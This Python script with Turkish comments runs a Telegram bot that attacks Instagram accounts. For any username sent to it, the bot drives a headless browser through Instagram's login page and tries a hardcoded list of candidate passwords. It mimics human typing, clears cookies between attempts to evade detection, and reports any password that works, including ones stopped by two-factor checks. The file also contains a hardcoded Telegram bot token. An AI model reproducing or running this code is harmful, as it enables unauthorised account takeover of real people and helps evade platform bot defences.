import time
import random
from flask import Flask
from threading import Thread
from playwright.sync_api import sync_playwright
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# --- WEB SUNUCUSU ---
app = Flask('')
@app.route('/')
def home(): return "Siber Saldırı Sistemi Aktif!"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- AYARLAR ---
TOKEN = "8220112113:AAGY10rcsQNfYhWNOW2w81dXjC6-LoLofoU"
# Senin verdiğin güncel ve kesin şifre listesi
HEDEF_SIFRELER = ["Emineminemin", "kakajan14709315414", "hajyhajy62626544"]

def instagram_login_attempt(username, password_list):
    results = []
    with sync_playwright() as p:
        # Tarayıcıyı başlat (Sunucuda çalışması için headless=True)
        browser = p.chromium.launch(headless=True)
        context = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        )
        page = context.new_page()

        for pwd in password_list:
            try:
                page.goto("https://www.instagram.com/accounts/login/")
                page.wait_for_selector('input[name="username"]', timeout=10000)
                
                # İnsan gibi yazma simülasyonu
                page.fill('input[name="username"]', username, delay=random.randint(150, 400))
                page.fill('input[name="password"]', pwd, delay=random.randint(150, 400))
                
                # Giriş butonuna tıkla
                page.click('button[type="submit"]')
                
                # Yanıt için biraz bekle
                time.sleep(7)
                
                # Başarı kontrolü
                content = page.content()
                if "Save Your Login Info" in content or "home" in page.url:
                    browser.close()
                    return pwd, "BAŞARILI"
                elif "checkpoint" in page.url:
                    browser.close()
                    return pwd, "2FA_GEREKLI" # Şifre doğru ama kod istiyor
                
                # Bir sonraki deneme için çerezleri temizle ve bekle
                context.clear_cookies()
                time.sleep(random.randint(10, 20))
                
            except Exception as e:
                continue
        
        browser.close()
    return None, "BASARISIZ"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("💀 Geliştirici Modu: Playwright Otomasyonu Hazır. Kullanıcı adını gönder.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_user = update.message.text
    status_msg = await update.message.reply_text(f"🎯 {target_user} için tarayıcı simülasyonu başlatılıyor...")
    
    found_pwd, status = instagram_login_attempt(target_user, HEDEF_SIFRELER)
    
    if status == "BAŞARILI":
        await update.message.reply_text(f"✅ **ŞİFRE BULUNDU!**\n\n👤 Kullanıcı: `{target_user}`\n🔑 Şifre: `{found_pwd}`", parse_mode="Markdown")
    elif status == "2FA_GEREKLI":
        await update.message.reply_text(f"🚩 **DOĞRU ŞİFRE:** `{found_pwd}`\n\nAncak Instagram iki faktörlü doğrulama (2FA) istedi. Hesaba girmek için telefon kodu lazım.")
    else:
        await update.message.reply_text("❌ Denenen 3 şifre de yanlış çıktı veya sistem botu engelledi.")

if __name__ == '__main__':
    keep_alive()
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    application.run_polling()
